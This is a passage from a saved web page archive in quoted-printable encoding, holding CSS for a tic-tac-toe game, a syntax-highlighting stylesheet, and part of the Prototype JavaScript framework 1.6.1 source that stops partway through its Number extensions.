	margin-bottom: 10px;
	font-size: 18px;
}

#oxoxox .playerScore {
	width: 50%;
	float: left;
}

#oxoxox .computerScore {
	width: 50%;
	float: left;
	text-align: right;
}

#oxoxox .board {
	background-image: url("../images/tictactoe.png");
	background-repeat: no-repeat;
	background-position: -20px -13px;
	position: relative;
	top: 0px;
	left: 0px;
}

#oxoxox .boardSection {
	width: 100px;
	height: 100px;
	margin-right: 5px;
	margin-bottom: 5px;
	border: 1px solid #fff;
	float: left;
	cursor: pointer;
=09
	-webkit-transition: all 0.2s ease-out;
	-moz-transition: all 0.2s ease-out;
	-o-transition: all 0.2s ease-out;
	transition: all 0.2s ease-out;
}

#oxoxox .boardSection:hover {
	border: 1px solid #7de0ff;
}

#oxoxox .boardSection.player {
	background: url("../images/player.png") no-repeat;
}

#oxoxox .boardSection.computer {
	background: url("../images/computer.png") no-repeat;
}

#oxoxox .newGame {
	display: block;
	padding-top: 5px;
	font-size: 14px;
	cursor: pointer;
}

#oxoxox .message {
	width: 277px;
	padding: 10px 20px;
	background: #7de0ff;
	font-size: 25px;
	opacity: 0.85;
	position: absolute;
	top: 132px;
	left: 0px;
}

#oxoxox .message.win {
	background: #77F5BC;
}

#oxoxox .message.lose {
	background: #F58187;
}

#oxoxox .message.tie {
	background: #FFCA34;
}

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://www.labelmedia.co.uk/assets/css/jush.css
Content-Transfer-Encoding: quoted-printable
Content-Type: text/css

.jush { color: black; }
.jush-htm_com, .jush-com, .jush-com_code, .jush-one, .jush-php_doc, .jush-p=
hp_com, .jush-php_one, .jush-js_one, .jush-js_doc { color: gray; }
.jush-php { color: #000033; }
.jush-php_quo, .jush-quo, .jush-php_eot, .jush-apo, .jush-sql_apo, .jush-sq=
lite_apo, .jush-sql_quo, .jush-sql_eot { color: green; }
.jush-php_apo { color: #009F00; }
.jush-php_quo_var, .jush-php_var, .jush-sql_var {color: #ac1323; }
.jush-php_apo .jush-php_quo_var, .jush-php_apo .jush-php_var { font-style:=
 normal; }
.jush-php_halt2 { background-color: white; color: black; }
.jush-tag_css, .jush-att_css .jush-att_quo, .jush-att_css .jush-att_apo, .j=
ush-att_css .jush-att_val { color: black; background-color: #FFFFE0; }
.jush-tag_js, .jush-att_js .jush-att_quo, .jush-att_js .jush-att_apo, .jush=
-att_js .jush-att_val, .jush-css_js { color: black; background-color: #F0F0=
FF; }
.jush-tag, .jush-xml_tag { color: navy; }
.jush-att, .jush-xml_att, .jush-att_js, .jush-att_css, .jush-att_http { col=
or: teal; }
.jush-att_quo, .jush-att_apo, .jush-att_val { color: purple; }
.jush-ent { color: purple; }
.jush-js_reg { color: navy; }
.jush-php_sql .jush-php_quo, .jush-php_sql .jush-php_apo,
.jush-php_sqlite .jush-php_quo, .jush-php_sqlite .jush-php_apo,
.jush-php_pgsql .jush-php_quo, .jush-php_pgsql .jush-php_apo,
.jush-php_mssql .jush-php_quo, .jush-php_mssql .jush-php_apo,

.jush-bac, .jush-php_bac, .jush-bra, .jush-mssql_bra, .jush-sqlite_quo { co=
lor: red; }
.jush-num, .jush-clr { color: red; }

.jush a { color: navy; }
.jush-sql a, .jush-sql_code a, .jush-sqlite a, .jush-pgsql a, .jush-mssql=
 a, .jush-oracle a { font-weight: bold; }
.jush-php_sql .jush-php_quo a, .jush-php_sql .jush-php_apo a { font-weight:=
 normal; }
.jush-tag a, .jush-att a, .jush-apo a, .jush-quo a, .jush-php_apo a, .jush-=
php_quo a, .jush-php_eot2 a { color: inherit; color: expression(parentNode.=
currentStyle.color); }
a.jush-custom:link, a.jush-custom:visited { font-weight: normal; color: inh=
erit; color: expression(parentNode.currentStyle.color); }

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/prototype/1.6.1/prototype.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

/*  Prototype JavaScript framework, version 1.6.1
 *  (c) 2005-2009 Sam Stephenson
 *
 *  Prototype is freely distributable under the terms of an MIT-style licen=
se.
 *  For details, see the Prototype web site: http://www.prototypejs.org/
 *
 *-------------------------------------------------------------------------=
-*/

var Prototype =3D {
  Version: '1.6.1',

  Browser: (function(){
    var ua =3D navigator.userAgent;
    var isOpera =3D Object.prototype.toString.call(window.opera) =3D=3D '[o=
bject Opera]';
    return {
      IE:             !!window.attachEvent && !isOpera,
      Opera:          isOpera,
      WebKit:         ua.indexOf('AppleWebKit/') > -1,
      Gecko:          ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') =3D=
=3D=3D -1,
      MobileSafari:   /Apple.*Mobile.*Safari/.test(ua)
    }
  })(),

  BrowserFeatures: {
    XPath: !!document.evaluate,
    SelectorsAPI: !!document.querySelector,
    ElementExtensions: (function() {
      var constructor =3D window.Element || window.HTMLElement;
      return !!(constructor && constructor.prototype);
    })(),
    SpecificElementExtensions: (function() {
      if (typeof window.HTMLDivElement !=3D=3D 'undefined')
        return true;

      var div =3D document.createElement('div');
      var form =3D document.createElement('form');
      var isSupported =3D false;

      if (div['__proto__'] && (div['__proto__'] !=3D=3D form['__proto__']))=
 {
        isSupported =3D true;
      }

      div =3D form =3D null;

      return isSupported;
    })()
  },

  ScriptFragment: '<script[^>]*>([\\S\\s]*?)<\/script>',
  JSONFilter: /^\/\*-secure-([\s\S]*)\*\/\s*$/,

  emptyFunction: function() { },
  K: function(x) { return x }
};

if (Prototype.Browser.MobileSafari)
  Prototype.BrowserFeatures.SpecificElementExtensions =3D false;


var Abstract =3D { };


var Try =3D {
  these: function() {
    var returnValue;

    for (var i =3D 0, length =3D arguments.length; i < length; i++) {
      var lambda =3D arguments[i];
      try {
        returnValue =3D lambda();
        break;
      } catch (e) { }
    }

    return returnValue;
  }
};

/* Based on Alex Arnell's inheritance implementation. */

var Class =3D (function() {
  function subclass() {};
  function create() {
    var parent =3D null, properties =3D $A(arguments);
    if (Object.isFunction(properties[0]))
      parent =3D properties.shift();

    function klass() {
      this.initialize.apply(this, arguments);
    }

    Object.extend(klass, Class.Methods);
    klass.superclass =3D parent;
    klass.subclasses =3D [];

    if (parent) {
      subclass.prototype =3D parent.prototype;
      klass.prototype =3D new subclass;
      parent.subclasses.push(klass);
    }

    for (var i =3D 0; i < properties.length; i++)
      klass.addMethods(properties[i]);

    if (!klass.prototype.initialize)
      klass.prototype.initialize =3D Prototype.emptyFunction;

    klass.prototype.constructor =3D klass;
    return klass;
  }

  function addMethods(source) {
    var ancestor   =3D this.superclass && this.superclass.prototype;
    var properties =3D Object.keys(source);

    if (!Object.keys({ toString: true }).length) {
      if (source.toString !=3D Object.prototype.toString)
        properties.push("toString");
      if (source.valueOf !=3D Object.prototype.valueOf)
        properties.push("valueOf");
    }

    for (var i =3D 0, length =3D properties.length; i < length; i++) {
      var property =3D properties[i], value =3D source[property];
      if (ancestor && Object.isFunction(value) &&
          value.argumentNames().first() =3D=3D "$super") {
        var method =3D value;
        value =3D (function(m) {
          return function() { return ancestor[m].apply(this, arguments); };
        })(property).wrap(method);

        value.valueOf =3D method.valueOf.bind(method);
        value.toString =3D method.toString.bind(method);
      }
      this.prototype[property] =3D value;
    }

    return this;
  }

  return {
    create: create,
    Methods: {
      addMethods: addMethods
    }
  };
})();
(function() {

  var _toString =3D Object.prototype.toString;

  function extend(destination, source) {
    for (var property in source)
      destination[property] =3D source[property];
    return destination;
  }

  function inspect(object) {
    try {
      if (isUndefined(object)) return 'undefined';
      if (object =3D=3D=3D null) return 'null';
      return object.inspect ? object.inspect() : String(object);
    } catch (e) {
      if (e instanceof RangeError) return '...';
      throw e;
    }
  }

  function toJSON(object) {
    var type =3D typeof object;
    switch (type) {
      case 'undefined':
      case 'function':
      case 'unknown': return;
      case 'boolean': return object.toString();
    }

    if (object =3D=3D=3D null) return 'null';
    if (object.toJSON) return object.toJSON();
    if (isElement(object)) return;

    var results =3D [];
    for (var property in object) {
      var value =3D toJSON(object[property]);
      if (!isUndefined(value))
        results.push(property.toJSON() + ': ' + value);
    }

    return '{' + results.join(', ') + '}';
  }

  function toQueryString(object) {
    return $H(object).toQueryString();
  }

  function toHTML(object) {
    return object && object.toHTML ? object.toHTML() : String.interpret(obj=
ect);
  }

  function keys(object) {
    var results =3D [];
    for (var property in object)
      results.push(property);
    return results;
  }

  function values(object) {
    var results =3D [];
    for (var property in object)
      results.push(object[property]);
    return results;
  }

  function clone(object) {
    return extend({ }, object);
  }

  function isElement(object) {
    return !!(object && object.nodeType =3D=3D 1);
  }

  function isArray(object) {
    return _toString.call(object) =3D=3D "[object Array]";
  }


  function isHash(object) {
    return object instanceof Hash;
  }

  function isFunction(object) {
    return typeof object =3D=3D=3D "function";
  }

  function isString(object) {
    return _toString.call(object) =3D=3D "[object String]";
  }

  function isNumber(object) {
    return _toString.call(object) =3D=3D "[object Number]";
  }

  function isUndefined(object) {
    return typeof object =3D=3D=3D "undefined";
  }

  extend(Object, {
    extend:        extend,
    inspect:       inspect,
    toJSON:        toJSON,
    toQueryString: toQueryString,
    toHTML:        toHTML,
    keys:          keys,
    values:        values,
    clone:         clone,
    isElement:     isElement,
    isArray:       isArray,
    isHash:        isHash,
    isFunction:    isFunction,
    isString:      isString,
    isNumber:      isNumber,
    isUndefined:   isUndefined
  });
})();
Object.extend(Function.prototype, (function() {
  var slice =3D Array.prototype.slice;

  function update(array, args) {
    var arrayLength =3D array.length, length =3D args.length;
    while (length--) array[arrayLength + length] =3D args[length];
    return array;
  }

  function merge(array, args) {
    array =3D slice.call(array, 0);
    return update(array, args);
  }

  function argumentNames() {
    var names =3D this.toString().match(/^[\s\(]*function[^(]*\(([^)]*)\)/)=
[1]
      .replace(/\/\/.*?[\r\n]|\/\*(?:.|[\r\n])*?\*\//g, '')
      .replace(/\s+/g, '').split(',');
    return names.length =3D=3D 1 && !names[0] ? [] : names;
  }

  function bind(context) {
    if (arguments.length < 2 && Object.isUndefined(arguments[0])) return th=
is;
    var __method =3D this, args =3D slice.call(arguments, 1);
    return function() {
      var a =3D merge(args, arguments);
      return __method.apply(context, a);
    }
  }

  function bindAsEventListener(context) {
    var __method =3D this, args =3D slice.call(arguments, 1);
    return function(event) {
      var a =3D update([event || window.event], args);
      return __method.apply(context, a);
    }
  }

  function curry() {
    if (!arguments.length) return this;
    var __method =3D this, args =3D slice.call(arguments, 0);
    return function() {
      var a =3D merge(args, arguments);
      return __method.apply(this, a);
    }
  }

  function delay(timeout) {
    var __method =3D this, args =3D slice.call(arguments, 1);
    timeout =3D timeout * 1000
    return window.setTimeout(function() {
      return __method.apply(__method, args);
    }, timeout);
  }

  function defer() {
    var args =3D update([0.01], arguments);
    return this.delay.apply(this, args);
  }

  function wrap(wrapper) {
    var __method =3D this;
    return function() {
      var a =3D update([__method.bind(this)], arguments);
      return wrapper.apply(this, a);
    }
  }

  function methodize() {
    if (this._methodized) return this._methodized;
    var __method =3D this;
    return this._methodized =3D function() {
      var a =3D update([this], arguments);
      return __method.apply(null, a);
    };
  }

  return {
    argumentNames:       argumentNames,
    bind:                bind,
    bindAsEventListener: bindAsEventListener,
    curry:               curry,
    delay:               delay,
    defer:               defer,
    wrap:                wrap,
    methodize:           methodize
  }
})());


Date.prototype.toJSON =3D function() {
  return '"' + this.getUTCFullYear() + '-' +
    (this.getUTCMonth() + 1).toPaddedString(2) + '-' +
    this.getUTCDate().toPaddedString(2) + 'T' +
    this.getUTCHours().toPaddedString(2) + ':' +
    this.getUTCMinutes().toPaddedString(2) + ':' +
    this.getUTCSeconds().toPaddedString(2) + 'Z"';
};


RegExp.prototype.match =3D RegExp.prototype.test;

RegExp.escape =3D function(str) {
  return String(str).replace(/([.*+?^=3D!:${}()|[\]\/\\])/g, '\\$1');
};
var PeriodicalExecuter =3D Class.create({
  initialize: function(callback, frequency) {
    this.callback =3D callback;
    this.frequency =3D frequency;
    this.currentlyExecuting =3D false;

    this.registerCallback();
  },

  registerCallback: function() {
    this.timer =3D setInterval(this.onTimerEvent.bind(this), this.frequency=
 * 1000);
  },

  execute: function() {
    this.callback(this);
  },

  stop: function() {
    if (!this.timer) return;
    clearInterval(this.timer);
    this.timer =3D null;
  },

  onTimerEvent: function() {
    if (!this.currentlyExecuting) {
      try {
        this.currentlyExecuting =3D true;
        this.execute();
        this.currentlyExecuting =3D false;
      } catch(e) {
        this.currentlyExecuting =3D false;
        throw e;
      }
    }
  }
});
Object.extend(String, {
  interpret: function(value) {
    return value =3D=3D null ? '' : String(value);
  },
  specialChar: {
    '\b': '\\b',
    '\t': '\\t',
    '\n': '\\n',
    '\f': '\\f',
    '\r': '\\r',
    '\\': '\\\\'
  }
});

Object.extend(String.prototype, (function() {

  function prepareReplacement(replacement) {
    if (Object.isFunction(replacement)) return replacement;
    var template =3D new Template(replacement);
    return function(match) { return template.evaluate(match) };
  }

  function gsub(pattern, replacement) {
    var result =3D '', source =3D this, match;
    replacement =3D prepareReplacement(replacement);

    if (Object.isString(pattern))
      pattern =3D RegExp.escape(pattern);

    if (!(pattern.length || pattern.source)) {
      replacement =3D replacement('');
      return replacement + source.split('').join(replacement) + replacement;
    }

    while (source.length > 0) {
      if (match =3D source.match(pattern)) {
        result +=3D source.slice(0, match.index);
        result +=3D String.interpret(replacement(match));
        source  =3D source.slice(match.index + match[0].length);
      } else {
        result +=3D source, source =3D '';
      }
    }
    return result;
  }

  function sub(pattern, replacement, count) {
    replacement =3D prepareReplacement(replacement);
    count =3D Object.isUndefined(count) ? 1 : count;

    return this.gsub(pattern, function(match) {
      if (--count < 0) return match[0];
      return replacement(match);
    });
  }

  function scan(pattern, iterator) {
    this.gsub(pattern, iterator);
    return String(this);
  }

  function truncate(length, truncation) {
    length =3D length || 30;
    truncation =3D Object.isUndefined(truncation) ? '...' : truncation;
    return this.length > length ?
      this.slice(0, length - truncation.length) + truncation : String(this);
  }

  function strip() {
    return this.replace(/^\s+/, '').replace(/\s+$/, '');
  }

  function stripTags() {
    return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');
  }

  function stripScripts() {
    return this.replace(new RegExp(Prototype.ScriptFragment, 'img'), '');
  }

  function extractScripts() {
    var matchAll =3D new RegExp(Prototype.ScriptFragment, 'img');
    var matchOne =3D new RegExp(Prototype.ScriptFragment, 'im');
    return (this.match(matchAll) || []).map(function(scriptTag) {
      return (scriptTag.match(matchOne) || ['', ''])[1];
    });
  }

  function evalScripts() {
    return this.extractScripts().map(function(script) { return eval(script)=
 });
  }

  function escapeHTML() {
    return this.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&g=
t;');
  }

  function unescapeHTML() {
    return this.stripTags().replace(/&lt;/g,'<').replace(/&gt;/g,'>').repla=
ce(/&amp;/g,'&');
  }


  function toQueryParams(separator) {
    var match =3D this.strip().match(/([^?#]*)(#.*)?$/);
    if (!match) return { };

    return match[1].split(separator || '&').inject({ }, function(hash, pair=
) {
      if ((pair =3D pair.split('=3D'))[0]) {
        var key =3D decodeURIComponent(pair.shift());
        var value =3D pair.length > 1 ? pair.join('=3D') : pair[0];
        if (value !=3D undefined) value =3D decodeURIComponent(value);

        if (key in hash) {
          if (!Object.isArray(hash[key])) hash[key] =3D [hash[key]];
          hash[key].push(value);
        }
        else hash[key] =3D value;
      }
      return hash;
    });
  }

  function toArray() {
    return this.split('');
  }

  function succ() {
    return this.slice(0, this.length - 1) +
      String.fromCharCode(this.charCodeAt(this.length - 1) + 1);
  }

  function times(count) {
    return count < 1 ? '' : new Array(count + 1).join(this);
  }

  function camelize() {
    var parts =3D this.split('-'), len =3D parts.length;
    if (len =3D=3D 1) return parts[0];

    var camelized =3D this.charAt(0) =3D=3D '-'
      ? parts[0].charAt(0).toUpperCase() + parts[0].substring(1)
      : parts[0];

    for (var i =3D 1; i < len; i++)
      camelized +=3D parts[i].charAt(0).toUpperCase() + parts[i].substring(=
1);

    return camelized;
  }

  function capitalize() {
    return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
  }

  function underscore() {
    return this.replace(/::/g, '/')
               .replace(/([A-Z]+)([A-Z][a-z])/g, '$1_$2')
               .replace(/([a-z\d])([A-Z])/g, '$1_$2')
               .replace(/-/g, '_')
               .toLowerCase();
  }

  function dasherize() {
    return this.replace(/_/g, '-');
  }

  function inspect(useDoubleQuotes) {
    var escapedString =3D this.replace(/[\x00-\x1f\\]/g, function(character=
) {
      if (character in String.specialChar) {
        return String.specialChar[character];
      }
      return '\\u00' + character.charCodeAt().toPaddedString(2, 16);
    });
    if (useDoubleQuotes) return '"' + escapedString.replace(/"/g, '\\"') +=
 '"';
    return "'" + escapedString.replace(/'/g, '\\\'') + "'";
  }

  function toJSON() {
    return this.inspect(true);
  }

  function unfilterJSON(filter) {
    return this.replace(filter || Prototype.JSONFilter, '$1');
  }

  function isJSON() {
    var str =3D this;
    if (str.blank()) return false;
    str =3D this.replace(/\\./g, '@').replace(/"[^"\\\n\r]*"/g, '');
    return (/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/).test(str);
  }

  function evalJSON(sanitize) {
    var json =3D this.unfilterJSON();
    try {
      if (!sanitize || json.isJSON()) return eval('(' + json + ')');
    } catch (e) { }
    throw new SyntaxError('Badly formed JSON string: ' + this.inspect());
  }

  function include(pattern) {
    return this.indexOf(pattern) > -1;
  }

  function startsWith(pattern) {
    return this.indexOf(pattern) =3D=3D=3D 0;
  }

  function endsWith(pattern) {
    var d =3D this.length - pattern.length;
    return d >=3D 0 && this.lastIndexOf(pattern) =3D=3D=3D d;
  }

  function empty() {
    return this =3D=3D '';
  }

  function blank() {
    return /^\s*$/.test(this);
  }

  function interpolate(object, pattern) {
    return new Template(this, pattern).evaluate(object);
  }

  return {
    gsub:           gsub,
    sub:            sub,
    scan:           scan,
    truncate:       truncate,
    strip:          String.prototype.trim ? String.prototype.trim : strip,
    stripTags:      stripTags,
    stripScripts:   stripScripts,
    extractScripts: extractScripts,
    evalScripts:    evalScripts,
    escapeHTML:     escapeHTML,
    unescapeHTML:   unescapeHTML,
    toQueryParams:  toQueryParams,
    parseQuery:     toQueryParams,
    toArray:        toArray,
    succ:           succ,
    times:          times,
    camelize:       camelize,
    capitalize:     capitalize,
    underscore:     underscore,
    dasherize:      dasherize,
    inspect:        inspect,
    toJSON:         toJSON,
    unfilterJSON:   unfilterJSON,
    isJSON:         isJSON,
    evalJSON:       evalJSON,
    include:        include,
    startsWith:     startsWith,
    endsWith:       endsWith,
    empty:          empty,
    blank:          blank,
    interpolate:    interpolate
  };
})());

var Template =3D Class.create({
  initialize: function(template, pattern) {
    this.template =3D template.toString();
    this.pattern =3D pattern || Template.Pattern;
  },

  evaluate: function(object) {
    if (object && Object.isFunction(object.toTemplateReplacements))
      object =3D object.toTemplateReplacements();

    return this.template.gsub(this.pattern, function(match) {
      if (object =3D=3D null) return (match[1] + '');

      var before =3D match[1] || '';
      if (before =3D=3D '\\') return match[2];

      var ctx =3D object, expr =3D match[3];
      var pattern =3D /^([^.[]+|\[((?:.*?[^\\])?)\])(\.|\[|$)/;
      match =3D pattern.exec(expr);
      if (match =3D=3D null) return before;

      while (match !=3D null) {
        var comp =3D match[1].startsWith('[') ? match[2].replace(/\\\\]/g,=
 ']') : match[1];
        ctx =3D ctx[comp];
        if (null =3D=3D ctx || '' =3D=3D match[3]) break;
        expr =3D expr.substring('[' =3D=3D match[3] ? match[1].length : mat=
ch[0].length);
        match =3D pattern.exec(expr);
      }

      return before + String.interpret(ctx);
    });
  }
});
Template.Pattern =3D /(^|.|\r|\n)(#\{(.*?)\})/;

var $break =3D { };

var Enumerable =3D (function() {
  function each(iterator, context) {
    var index =3D 0;
    try {
      this._each(function(value) {
        iterator.call(context, value, index++);
      });
    } catch (e) {
      if (e !=3D $break) throw e;
    }
    return this;
  }

  function eachSlice(number, iterator, context) {
    var index =3D -number, slices =3D [], array =3D this.toArray();
    if (number < 1) return array;
    while ((index +=3D number) < array.length)
      slices.push(array.slice(index, index+number));
    return slices.collect(iterator, context);
  }

  function all(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var result =3D true;
    this.each(function(value, index) {
      result =3D result && !!iterator.call(context, value, index);
      if (!result) throw $break;
    });
    return result;
  }

  function any(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var result =3D false;
    this.each(function(value, index) {
      if (result =3D !!iterator.call(context, value, index))
        throw $break;
    });
    return result;
  }

  function collect(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var results =3D [];
    this.each(function(value, index) {
      results.push(iterator.call(context, value, index));
    });
    return results;
  }

  function detect(iterator, context) {
    var result;
    this.each(function(value, index) {
      if (iterator.call(context, value, index)) {
        result =3D value;
        throw $break;
      }
    });
    return result;
  }

  function findAll(iterator, context) {
    var results =3D [];
    this.each(function(value, index) {
      if (iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  }

  function grep(filter, iterator, context) {
    iterator =3D iterator || Prototype.K;
    var results =3D [];

    if (Object.isString(filter))
      filter =3D new RegExp(RegExp.escape(filter));

    this.each(function(value, index) {
      if (filter.match(value))
        results.push(iterator.call(context, value, index));
    });
    return results;
  }

  function include(object) {
    if (Object.isFunction(this.indexOf))
      if (this.indexOf(object) !=3D -1) return true;

    var found =3D false;
    this.each(function(value) {
      if (value =3D=3D object) {
        found =3D true;
        throw $break;
      }
    });
    return found;
  }

  function inGroupsOf(number, fillWith) {
    fillWith =3D Object.isUndefined(fillWith) ? null : fillWith;
    return this.eachSlice(number, function(slice) {
      while(slice.length < number) slice.push(fillWith);
      return slice;
    });
  }

  function inject(memo, iterator, context) {
    this.each(function(value, index) {
      memo =3D iterator.call(context, memo, value, index);
    });
    return memo;
  }

  function invoke(method) {
    var args =3D $A(arguments).slice(1);
    return this.map(function(value) {
      return value[method].apply(value, args);
    });
  }

  function max(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value =3D iterator.call(context, value, index);
      if (result =3D=3D null || value >=3D result)
        result =3D value;
    });
    return result;
  }

  function min(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var result;
    this.each(function(value, index) {
      value =3D iterator.call(context, value, index);
      if (result =3D=3D null || value < result)
        result =3D value;
    });
    return result;
  }

  function partition(iterator, context) {
    iterator =3D iterator || Prototype.K;
    var trues =3D [], falses =3D [];
    this.each(function(value, index) {
      (iterator.call(context, value, index) ?
        trues : falses).push(value);
    });
    return [trues, falses];
  }

  function pluck(property) {
    var results =3D [];
    this.each(function(value) {
      results.push(value[property]);
    });
    return results;
  }

  function reject(iterator, context) {
    var results =3D [];
    this.each(function(value, index) {
      if (!iterator.call(context, value, index))
        results.push(value);
    });
    return results;
  }

  function sortBy(iterator, context) {
    return this.map(function(value, index) {
      return {
        value: value,
        criteria: iterator.call(context, value, index)
      };
    }).sort(function(left, right) {
      var a =3D left.criteria, b =3D right.criteria;
      return a < b ? -1 : a > b ? 1 : 0;
    }).pluck('value');
  }

  function toArray() {
    return this.map();
  }

  function zip() {
    var iterator =3D Prototype.K, args =3D $A(arguments);
    if (Object.isFunction(args.last()))
      iterator =3D args.pop();

    var collections =3D [this].concat(args).map($A);
    return this.map(function(value, index) {
      return iterator(collections.pluck(index));
    });
  }

  function size() {
    return this.toArray().length;
  }

  function inspect() {
    return '#<Enumerable:' + this.toArray().inspect() + '>';
  }









  return {
    each:       each,
    eachSlice:  eachSlice,
    all:        all,
    every:      all,
    any:        any,
    some:       any,
    collect:    collect,
    map:        collect,
    detect:     detect,
    findAll:    findAll,
    select:     findAll,
    filter:     findAll,
    grep:       grep,
    include:    include,
    member:     include,
    inGroupsOf: inGroupsOf,
    inject:     inject,
    invoke:     invoke,
    max:        max,
    min:        min,
    partition:  partition,
    pluck:      pluck,
    reject:     reject,
    sortBy:     sortBy,
    toArray:    toArray,
    entries:    toArray,
    zip:        zip,
    size:       size,
    inspect:    inspect,
    find:       detect
  };
})();
function $A(iterable) {
  if (!iterable) return [];
  if ('toArray' in Object(iterable)) return iterable.toArray();
  var length =3D iterable.length || 0, results =3D new Array(length);
  while (length--) results[length] =3D iterable[length];
  return results;
}

function $w(string) {
  if (!Object.isString(string)) return [];
  string =3D string.strip();
  return string ? string.split(/\s+/) : [];
}

Array.from =3D $A;


(function() {
  var arrayProto =3D Array.prototype,
      slice =3D arrayProto.slice,
      _each =3D arrayProto.forEach; // use native browser JS 1.6 implementa=
tion if available

  function each(iterator) {
    for (var i =3D 0, length =3D this.length; i < length; i++)
      iterator(this[i]);
  }
  if (!_each) _each =3D each;

  function clear() {
    this.length =3D 0;
    return this;
  }

  function first() {
    return this[0];
  }

  function last() {
    return this[this.length - 1];
  }

  function compact() {
    return this.select(function(value) {
      return value !=3D null;
    });
  }

  function flatten() {
    return this.inject([], function(array, value) {
      if (Object.isArray(value))
        return array.concat(value.flatten());
      array.push(value);
      return array;
    });
  }

  function without() {
    var values =3D slice.call(arguments, 0);
    return this.select(function(value) {
      return !values.include(value);
    });
  }

  function reverse(inline) {
    return (inline !=3D=3D false ? this : this.toArray())._reverse();
  }

  function uniq(sorted) {
    return this.inject([], function(array, value, index) {
      if (0 =3D=3D index || (sorted ? array.last() !=3D value : !array.incl=
ude(value)))
        array.push(value);
      return array;
    });
  }

  function intersect(array) {
    return this.uniq().findAll(function(item) {
      return array.detect(function(value) { return item =3D=3D=3D value });
    });
  }


  function clone() {
    return slice.call(this, 0);
  }

  function size() {
    return this.length;
  }

  function inspect() {
    return '[' + this.map(Object.inspect).join(', ') + ']';
  }

  function toJSON() {
    var results =3D [];
    this.each(function(object) {
      var value =3D Object.toJSON(object);
      if (!Object.isUndefined(value)) results.push(value);
    });
    return '[' + results.join(', ') + ']';
  }

  function indexOf(item, i) {
    i || (i =3D 0);
    var length =3D this.length;
    if (i < 0) i =3D length + i;
    for (; i < length; i++)
      if (this[i] =3D=3D=3D item) return i;
    return -1;
  }

  function lastIndexOf(item, i) {
    i =3D isNaN(i) ? this.length : (i < 0 ? this.length + i : i) + 1;
    var n =3D this.slice(0, i).reverse().indexOf(item);
    return (n < 0) ? n : i - n - 1;
  }

  function concat() {
    var array =3D slice.call(this, 0), item;
    for (var i =3D 0, length =3D arguments.length; i < length; i++) {
      item =3D arguments[i];
      if (Object.isArray(item) && !('callee' in item)) {
        for (var j =3D 0, arrayLength =3D item.length; j < arrayLength; j++)
          array.push(item[j]);
      } else {
        array.push(item);
      }
    }
    return array;
  }

  Object.extend(arrayProto, Enumerable);

  if (!arrayProto._reverse)
    arrayProto._reverse =3D arrayProto.reverse;

  Object.extend(arrayProto, {
    _each:     _each,
    clear:     clear,
    first:     first,
    last:      last,
    compact:   compact,
    flatten:   flatten,
    without:   without,
    reverse:   reverse,
    uniq:      uniq,
    intersect: intersect,
    clone:     clone,
    toArray:   clone,
    size:      size,
    inspect:   inspect,
    toJSON:    toJSON
  });

  var CONCAT_ARGUMENTS_BUGGY =3D (function() {
    return [].concat(arguments)[0][0] !=3D=3D 1;
  })(1,2)

  if (CONCAT_ARGUMENTS_BUGGY) arrayProto.concat =3D concat;

  if (!arrayProto.indexOf) arrayProto.indexOf =3D indexOf;
  if (!arrayProto.lastIndexOf) arrayProto.lastIndexOf =3D lastIndexOf;
})();
function $H(object) {
  return new Hash(object);
};

var Hash =3D Class.create(Enumerable, (function() {
  function initialize(object) {
    this._object =3D Object.isHash(object) ? object.toObject() : Object.clo=
ne(object);
  }

  function _each(iterator) {
    for (var key in this._object) {
      var value =3D this._object[key], pair =3D [key, value];
      pair.key =3D key;
      pair.value =3D value;
      iterator(pair);
    }
  }

  function set(key, value) {
    return this._object[key] =3D value;
  }

  function get(key) {
    if (this._object[key] !=3D=3D Object.prototype[key])
      return this._object[key];
  }

  function unset(key) {
    var value =3D this._object[key];
    delete this._object[key];
    return value;
  }

  function toObject() {
    return Object.clone(this._object);
  }

  function keys() {
    return this.pluck('key');
  }

  function values() {
    return this.pluck('value');
  }

  function index(value) {
    var match =3D this.detect(function(pair) {
      return pair.value =3D=3D=3D value;
    });
    return match && match.key;
  }

  function merge(object) {
    return this.clone().update(object);
  }

  function update(object) {
    return new Hash(object).inject(this, function(result, pair) {
      result.set(pair.key, pair.value);
      return result;
    });
  }

  function toQueryPair(key, value) {
    if (Object.isUndefined(value)) return key;
    return key + '=3D' + encodeURIComponent(String.interpret(value));
  }

  function toQueryString() {
    return this.inject([], function(results, pair) {
      var key =3D encodeURIComponent(pair.key), values =3D pair.value;

      if (values && typeof values =3D=3D 'object') {
        if (Object.isArray(values))
          return results.concat(values.map(toQueryPair.curry(key)));
      } else results.push(toQueryPair(key, values));
      return results;
    }).join('&');
  }

  function inspect() {
    return '#<Hash:{' + this.map(function(pair) {
      return pair.map(Object.inspect).join(': ');
    }).join(', ') + '}>';
  }

  function toJSON() {
    return Object.toJSON(this.toObject());
  }

  function clone() {
    return new Hash(this);
  }

  return {
    initialize:             initialize,
    _each:                  _each,
    set:                    set,
    get:                    get,
    unset:                  unset,
    toObject:               toObject,
    toTemplateReplacements: toObject,
    keys:                   keys,
    values:                 values,
    index:                  index,
    merge:                  merge,
    update:                 update,
    toQueryString:          toQueryString,
    inspect:                inspect,
    toJSON:                 toJSON,
    clone:                  clone
  };
})());

Hash.from =3D $H;
Object.extend(Number.prototype, (function() {
  function toColorPart() {
    return this.toPaddedString(2, 16);
  }

  function succ() {
    return this + 1;
  }

  function times(iterator, context) {
    $R(0, this, true).each(iterator, context);
    return this;
  }

  function toPaddedString(length, radix) {
    var string =3D this.toString(radix || 10);
    return '0'.times(length - string.length) + string;
  }

  function toJSON() {
    return isFinite(this) ? this.toString() : 'null';
  }

  function abs() {
    return Math.abs(this);
  }

  function round() {
    return Math.round(this);
  }

  function ceil() {
    return Math.ceil(this);
  }

  function floor() {
    return Math.floor(this);
  }

